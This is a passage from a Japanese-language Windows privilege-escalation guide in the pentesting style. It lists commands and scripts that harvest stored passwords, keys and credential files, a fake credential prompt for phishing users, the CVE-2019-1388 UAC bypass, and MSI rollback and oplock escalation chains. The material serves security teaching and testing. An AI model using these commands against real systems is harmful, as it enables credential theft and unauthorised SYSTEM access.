HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **リモート デスクトップ資格情報マネージャー**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use **Mimikatz** の `dpapi::rdg` module と適切な `/masterkey` を使用して、**任意の .rdg files を復号**する\
Mimikatz の `sekurlsa::dpapi` module を使用すると、メモリから**多数の DPAPI masterkeys を抽出**できる

### Sticky Notes

Windows workstation では、Sticky Notes app を使って**passwords**やその他の情報を**保存**していることがよくありますが、これが database file であることに気付いていない場合があります。この file は `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` にあり、常に検索して調査する価値があります。

### AppCmd.exe

**AppCmd.exe から passwords を復元するには、Administrator であり、High Integrity level で実行する必要があることに注意してください。**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` directory にあります。\
この file が存在する場合、何らかの **credentials** が設定されており、**復元**できる可能性があります。

この code は [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) から抽出されました：
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認します。\
インストーラーは **SYSTEM 権限で実行される**ため、多くが **DLL Sideloading に対して脆弱です（情報元: ** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**）。**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## ファイルとレジストリ（認証情報）

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### PuTTY SSHホストキー
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### レジストリ内の SSH keys

SSH private keys はレジストリキー `HKCU\Software\OpenSSH\Agent\Keys` 内に保存される可能性があるため、そこに興味深いものがないか確認してください。
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
そのパス内にエントリが見つかった場合、それはおそらく保存された SSH key です。暗号化されて保存されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使用して簡単に復号できます。\
この technique の詳細については、こちらを参照してください: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` service が実行されておらず、boot 時に自動的に起動したい場合は、次を実行します:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> この technique はもう有効ではないようです。いくつか ssh keys を作成し、`ssh-add` で追加して、ssh 経由でマシンにログインしようとしました。しかし、レジストリの HKCU\Software\OpenSSH\Agent\Keys は存在せず、procmon でも非対称鍵認証中に `dpapi.dll` が使用されたことを確認できませんでした。

### 無人セットアップ ファイル
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
**metasploit** を使用して、次のファイルを検索することもできます： _post/windows/gather/enum_unattend_

内容の例：
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM バックアップ
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### クラウド認証情報
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** というファイルを検索します。

### Cached GPP Password

以前は、Group Policy Preferences (GPP) を使用して、複数のマシンにカスタムのローカル administrator アカウントを展開できる機能がありました。しかし、この方法には重大な security flaw がありました。第一に、SYSVOL に XML ファイルとして保存されている Group Policy Objects (GPOs) には、すべての domain user がアクセスできました。第二に、公開されているデフォルトキーを使用して AES256 で暗号化された、これらの GPP 内の password は、認証済みのユーザーであれば誰でも復号できました。これにより、ユーザーが elevated privileges を取得できる可能性があり、深刻なリスクが生じていました。

このリスクを軽減するため、空でない `"cpassword"` フィールドを含む、ローカルに cached された GPP ファイルをスキャンする function が開発されました。このようなファイルが見つかると、function は password を復号し、custom PowerShell object を返します。この object には、GPP に関する details とファイルの location が含まれており、この security vulnerability の特定と remediation に役立ちます。

`C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista より前)_ で、以下のファイルを検索します。

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexecを使用してパスワードを取得する：
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
credentialsを含むweb.configの例:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN の認証情報
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### credentialsを要求する

相手が知っている可能性があると思う場合は、**ユーザーにcredentialsを入力するよう求めたり、別のユーザーのcredentialsを入力するよう求めたりすることもできます**（ただし、クライアントに直接**credentials**を尋ねるのは非常に**risky**です）。
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **認証情報を含む可能性のあるファイル名**

過去に **パスワード** が **clear-text** または **Base64** で含まれていたことが知られているファイル
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
提案されたすべてのファイルを検索：
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin 内の認証情報

認証情報がないか、ごみ箱も確認してください

複数のプログラムで保存された**パスワードを復元**するには、次を使用できます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**認証情報を含む可能性があるその他のレジストリキー**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**レジストリからopensshキーを抽出する。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザーの履歴

**ChromeまたはFirefox**のパスワードが保存されているdbを確認してください。\
また、ブラウザーの履歴、ブックマーク、お気に入りも確認してください。そこに**パスワードが**保存されている可能性があります。

ブラウザーからパスワードを抽出するTools:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**はWindows operating systemに組み込まれたtechnologyであり、異なる言語のsoftware components間の**intercommunication**を可能にします。各COM componentは**class ID (CLSID)**によって**identified**され、各componentは1つ以上のinterfaceを介してfunctionalityを公開します。interfaceはinterface IDs (IIDs)によってidentifiedされます。

COM classesとinterfacesは、それぞれレジストリの**HKEY\CLASSES\ROOT\CLSID**および**HKEY\CLASSES\ROOT\Interface**の下に定義されています。このレジストリは、**HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT**をマージして作成されます。

このレジストリのCLSID内には、child registry **InProcServer32**があります。これには、**DLL**を指す**default value**と、**Apartment** (Single-Threaded)、**Free** (Multi-Threaded)、**Both** (SingleまたはMulti)、**Neutral** (Thread Neutral)のいずれかになる**ThreadingModel**というvalueが含まれています。

![Browsers History - COM DLL Overwriting: このレジストリのCLSID内には、DLLを指すdefault valueとvalue...を含むchild registry InProcServer32があります](<../../images/image (729).png>)

基本的に、実行される**DLLのいずれかをoverwrite**でき、そのDLLが別のuserによって実行される場合、**privilegesをescalate**できます。

攻撃者がCOM Hijackingをpersistence mechanismとして使用する方法については、以下を確認してください:


{{#ref}}
com-hijacking.md
{{#endref}}

### **ファイルとレジストリ内のGeneric Password search**

**ファイル内容を検索する**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名のファイルを検索**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリでキー名とパスワードを検索する**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### パスワードを検索するTools

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **はmsf** pluginで、victim内のcredentialsを検索するすべてのmetasploit POST moduleを**自動的に実行**するために作成しました。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は、このページで説明されているパスワードを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) は、systemからpasswordをextractするもう1つの優れたtoolです。

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、これらのデータをclear textで保存する複数のtool（PuTTY、WinSCP、FileZilla、SuperPuTTY、RDP）の**sessions**、**usernames**、**passwords**を検索します。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

**SYSTEM として実行されているプロセスが、完全なアクセス権で新しいプロセス**（`OpenProcess()`）を**開く**とします。同じプロセスが、**メインプロセスのすべての open handles を継承し、低い権限で新しいプロセスを作成**（`CreateProcess()`）することもあります。\
その後、**低権限プロセスに対する完全なアクセス権**を持っていれば、`OpenProcess()` で作成された特権プロセスへの**open handle**を取得し、**shellcode を inject**できます。\
**この脆弱性の検出および悪用方法**の詳細については、[この例](leaked-handle-exploitation.md)を参照してください。\
**異なる権限レベル（完全なアクセス権だけではありません）で継承された、プロセスおよびスレッドの open handlers をテストして悪用する方法**についての、より詳しい説明は[こちらの別の投稿](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)を参照してください。

## Named Pipe Client Impersonation

**pipes**と呼ばれる共有メモリセグメントにより、プロセス間の通信およびデータ転送が可能になります。

Windows には **Named Pipes** と呼ばれる機能があり、異なるネットワーク上であっても、無関係なプロセス間でデータを共有できます。これは、**named pipe server** と **named pipe client** という役割を持つ、client/server アーキテクチャに似ています。

**client** が pipe 経由でデータを送信すると、pipe を設定した **server** は、必要な **SeImpersonate** 権限を持っている場合、**client の identity を引き受ける**ことができます。偽装可能な pipe を介して通信する**特権プロセス**を特定できれば、自分が確立した pipe とそのプロセスが通信した時点で、そのプロセスの identity を引き受け、**より高い権限を取得**できる可能性があります。この攻撃の実行方法については、[**こちら**](named-pipe-client-impersonation.md)および[**こちら**](#from-high-integrity-to-system)のガイドを参照してください。

また、次の tool を使用すると、[**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) のような tool で **named pipe 通信を intercept**できます。さらに、次の tool を使用すると、すべての pipe を一覧表示および確認して privescs を見つけられます: [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv リモート DWORD write による RCE

Telephony service（TapiSrv）は server mode で `\\pipe\\tapsrv`（MS-TRP）を公開します。remote authenticated client は、mailslot ベースの async event path を悪用して、`ClientAttach` を `NETWORK SERVICE` に書き込み可能な既存ファイルへの任意の **4-byte write** に変換し、その後 Telephony admin 権限を取得して、任意の DLL を service として load できます。完全な流れは次のとおりです。

- `pszDomainUser` に書き込み可能な既存パスを設定して `ClientAttach` → service は `CreateFileW(..., OPEN_EXISTING)` でそのパスを開き、async event writes に使用します。
- 各 event は、`Initialize` から attacker-controlled な `InitContext` をその handle に書き込みます。`LRegisterRequestRecipient`（`Req_Func 61`）で line app を登録し、`TRequestMakeCall`（`Req_Func 121`）を trigger し、`GetAsyncEvents`（`Req_Func 0`）で取得した後、unregister/shutdown して deterministic な write を繰り返します。
- `C:\Windows\TAPI\tsec.ini` の `[TapiAdministrators]` に自分を追加して reconnect し、任意の DLL path を指定して `GetUIDllName` を呼び出すと、`NETWORK SERVICE` として `TSPI_providerUIIdentify` を実行できます。

詳細:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### Windows で stuff を実行できる File Extensions

**[https://filesec.io/](https://filesec.io/)** のページを確認してください。

### Markdown renderers を介した Protocol handler / ShellExecute abuse

`ShellExecuteExW` に転送されるクリック可能な Markdown links は、危険な URI handlers（`file:`、`ms-appinstaller:`、または登録済みの任意の scheme）を trigger し、current user として attacker-controlled な files を実行する可能性があります。詳細:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **passwords の Command Lines を Monitoring**

user として shell を取得した場合、**command line で credentials を渡す** scheduled tasks やその他の processes が実行されている可能性があります。以下の script は、2 秒ごとに process command lines を capture し、現在の state と前回の state を比較して、差分を出力します。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## プロセスからパスワードを窃取する

## 低権限ユーザーから NT\AUTHORITY SYSTEM へ (CVE-2019-1388) / UAC Bypass

グラフィカルインターフェース（コンソールまたは RDP 経由）にアクセスでき、UAC が有効になっている場合、Microsoft Windows の一部のバージョンでは、権限のないユーザーから terminal や、"NT\AUTHORITY SYSTEM" などの他のプロセスを実行できます。

これにより、同じ脆弱性を利用して、権限昇格と UAC のバイパスを同時に実行できます。さらに、何もインストールする必要がなく、プロセス中に使用される binary は Microsoft によって署名および発行されています。

影響を受けるシステムの一部は次のとおりです。
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
この脆弱性をexploitするには、以下の手順を実行する必要があります。
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
リポジトリには、必要なすべてのファイルと情報が含まれています。

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium から High Integrity Level へ / UAC Bypass

**Integrity Levels について学ぶには、こちらを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

次に、**UAC と UAC bypasses について学ぶには、こちらを読んでください:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename から SYSTEM EoP へ

[**この blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)で説明されている technique で、exploit code は[**こちらで入手できます**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)。<sup>[[31]](#references)[[32]](#references)</sup>

この attack は基本的に、Windows Installer の rollback feature を悪用し、uninstallation process 中に正規の files を malicious な files に置き換えます。そのために attacker は、**malicious MSI installer** を作成する必要があります。この installer は `C:\Config.Msi` folder を hijack するために使用されます。その後、この folder は Windows Installer によって他の MSI packages の uninstallation 中に rollback files を保存するために使用されます。この rollback files は、malicious payload を含むように変更されています。

technique の概要は以下のとおりです。

1. **Stage 1 – Hijack の準備（`C:\Config.Msi` を空にする）**

- Step 1: MSI を install
- writable folder（`TARGETDIR`）に harmless file（例: `dummy.txt`）を install する `.msi` を作成します。
- installer を **"UAC Compliant"** として設定し、**non-admin user** が実行できるようにします。
- install 後も file への **handle** を open のままにします。

- Step 2: Uninstall の開始
- 同じ `.msi` を uninstall します。
- uninstall process は files を `C:\Config.Msi` に移動し、`.rbf` files（rollback backups）に rename し始めます。
- `GetFinalPathNameByHandle` を使用して open file handle を **poll** し、file が `C:\Config.Msi\<random>.rbf` になったことを検出します。

- Step 3: Custom Syncing
- `.msi` には **custom uninstall action (`SyncOnRbfWritten`)** が含まれており、以下を行います。
- `.rbf` が書き込まれたことを signal します。
- その後、uninstall を続行する前に別の event を **wait** します。

- Step 4: `.rbf` の削除を block
- signal を受けたら、`FILE_SHARE_DELETE` なしで **`.rbf file を open** します。これにより、file が削除されるのを **prevent** します。
- その後、uninstall を完了できるように signal を返します。
- Windows Installer は `.rbf` の削除に失敗し、すべての contents を削除できないため、**`C:\Config.Msi` は削除されません**。

- Step 5: `.rbf` を手動で delete
- attacker であるあなたが、`.rbf` file を手動で delete します。
- これで **`C:\Config.Msi` は空になり、hijack の準備が整います**。

> この時点で、**SYSTEM-level arbitrary folder delete vulnerability** を trigger し、`C:\Config.Msi` を delete します。

2. **Stage 2 – Rollback Scripts を Malicious なものに置き換える**

- Step 6: Weak ACLs を設定して `C:\Config.Msi` を再作成
- `C:\Config.Msi` folder を自分で再作成します。
- **weak DACLs**（例: Everyone:F）を設定し、`WRITE_DAC` を使用して **handle を open のまま**にします。

- Step 7: 別の Install を実行
- 以下の設定で `.msi` を再度 install します。
- `TARGETDIR`: Writable location。
- `ERROROUT`: forced failure を trigger する variable。
- この install は、`.rbs` と `.rbf` を再び読み取る **rollback** を trigger するために使用されます。

- Step 8: `.rbs` を monitor
- `ReadDirectoryChangesW` を使用して `C:\Config.Msi` を monitor し、新しい `.rbs` が現れるまで待ちます。
- その filename を取得します。

- Step 9: Rollback 前に Sync
- `.msi` には **custom install action (`SyncBeforeRollback`)** が含まれており、以下を行います。
- `.rbs` が作成されたときに event を signal します。
- その後、続行する前に **wait** します。

- Step 10: Weak ACL を再適用
- `.rbs created` event を受信した後:
- Windows Installer は `C:\Config.Msi` に **strong ACLs** を再適用します。
- しかし、`WRITE_DAC` を持つ handle をまだ保持しているため、再び **weak ACLs を再適用**できます。

> ACLs は **handle open 時にのみ適用される**ため、folder への write は引き続き可能です。

- Step 11: Fake `.rbs` と `.rbf` を配置
- `.rbs` file を **fake rollback script** で overwrite します。この script は Windows に以下を指示します。
- `.rbf` file（malicious DLL）を **privileged location**（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）に restore します。
- **malicious SYSTEM-level payload DLL** を含む fake `.rbf` を配置します。

- Step 12: Rollback を trigger
- sync event を signal し、installer を再開させます。
- **type 19 custom action (`ErrorOut`)** は、既知の point で install を **意図的に fail** させるよう設定されています。
- これにより **rollback が開始**されます。

- Step 13: SYSTEM が DLL を install
- Windows Installer は以下を行います。
- malicious `.rbs` を読み取ります。
- `.rbf` DLL を target location に copy します。
- これで **SYSTEM によって load される path に malicious DLL が配置されます**。

- Final Step: SYSTEM code を execute
- hijack した DLL を load する trusted **auto-elevated binary**（例: `osk.exe`）を実行します。
- **Boom**: code が **SYSTEM として execute**されます。


### Arbitrary File Delete/Move/Rename から SYSTEM EoP へ

主要な MSI rollback technique（前述のもの）は、**entire folder**（例: `C:\Config.Msi`）を delete できることを前提としています。しかし、vulnerability が **arbitrary file deletion** しか許可しない場合はどうでしょうか？

**NTFS internals** を exploit できます。すべての folder には、次の名前の hidden alternate data stream があります：
```
C:\SomeFolder::$INDEX_ALLOCATION
```
このストリームには、フォルダーの**インデックスメタデータ**が格納されています。

そのため、フォルダーの **`::$INDEX_ALLOCATION` ストリーム**を**削除**すると、NTFS はファイルシステムから**フォルダー全体を削除**します。

これは、次のような標準のファイル削除 API を使用して実行できます：
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> *file* delete API を呼び出しているにもかかわらず、**フォルダー自体が削除されます**。

### フォルダーの内容の削除から SYSTEM EoP へ
primitive で任意のファイルやフォルダーを削除できなくても、攻撃者が制御するフォルダーの**内容を削除**できる場合はどうでしょうか？

1. Step 1: 囮フォルダーとファイルをセットアップする
- 作成: `C:\temp\folder1`
- その中に作成: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を設定する
- 特権プロセスが `file1.txt` を削除しようとすると、oplock により**実行が一時停止**されます。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Step 3: SYSTEM processをトリガーする（例: `SilentCleanup`）
- このprocessはフォルダー（例: `%TEMP%`）をスキャンし、その内容を削除しようとします。
- `file1.txt`に到達すると、**oplock triggers**し、controlをcallbackに渡します。

4. Step 4: oplock callback内で削除先をリダイレクトする

- Option A: `file1.txt`を別の場所へ移動する
- これにより、oplockを壊さずに`folder1`を空にできます。
- `file1.txt`を直接削除しないでください。削除すると、oplockが早期にreleaseされます。

- Option B: `folder1`を**junction**に変換する：
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
